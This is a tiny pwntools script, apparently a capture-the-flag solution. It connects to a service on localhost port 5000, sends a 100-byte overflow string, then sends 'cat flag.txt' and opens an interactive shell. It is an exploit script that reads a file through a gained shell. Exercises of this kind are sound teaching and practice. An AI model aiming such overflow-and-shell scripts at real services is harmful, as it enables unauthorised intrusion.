from pwn import *


p=remote("localhost",5000)

p.sendline("a"*100)

# i got my shell now i get the flag
p.sendline("cat flag.txt")

p.interactive()